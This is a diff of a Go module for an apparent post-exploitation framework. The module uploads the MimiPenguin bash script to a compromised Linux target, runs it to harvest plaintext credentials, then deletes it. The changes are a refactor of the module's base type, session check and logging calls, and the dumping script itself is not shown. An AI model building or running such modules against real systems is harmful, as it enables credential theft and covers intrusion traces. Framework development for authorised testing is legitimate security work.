@@ -29,12 +29,12 @@ import (
 
 // MimiPenguin - A module for retrieving plaintext credentials
 type MimiPenguin struct {
-	*module.Module
+	*module.Post
 }
 
 // New - Instantiates a MimiPenguin module
 func New() *MimiPenguin {
-	mod := &MimiPenguin{&module.Module{}}
+	mod := &MimiPenguin{module.NewPost()}
 	mod.Path = []string{"post/linux/x64/bash/credentials/MimiPenguin"}
 	return mod
 }
@@ -51,8 +51,8 @@ func (s *MimiPenguin) Run(command string) (result string, err error) {
 	}
 
 	// Check session
-	sess, err := s.GetSession()
-	if sess == nil {
+	err = s.GetSession()
+	if err != nil {
 		return "", err
 	}
 
@@ -66,31 +66,31 @@ func (s *MimiPenguin) Run(command string) (result string, err error) {
 	timeout := time.Second * 30
 
 	// Upload MimiPenguin script on target
-	s.ModuleEvent(fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value))
+	s.Event(fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value))
 	result, err = s.Upload(src, rpath, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(result)
+		s.Event(result)
 	}
 
 	// Execute Script
-	s.ModuleEvent("Running script ...")
+	s.Event("Running script ...")
 	time.Sleep(time.Millisecond * 500)
 	result, err = s.Execute(rpath, []string{}, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(result)
+		s.Event(result)
 	}
 
 	// Delete script
-	s.ModuleEvent("Deleting script ...")
+	s.Event("Deleting script ...")
 	result, err = s.Remove(rpath, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(result)
+		s.Event(result)
 	}
 
 	return "Module executed", nil
